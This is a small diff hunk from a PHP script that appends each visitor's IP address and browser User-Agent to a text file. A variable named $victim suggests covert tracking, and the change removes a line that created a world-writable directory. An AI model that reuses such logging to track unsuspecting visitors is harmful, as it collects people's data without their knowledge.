@@ -15,7 +15,6 @@ else
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
-mkdir("data", 0777);
 $file = 'data/ip.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
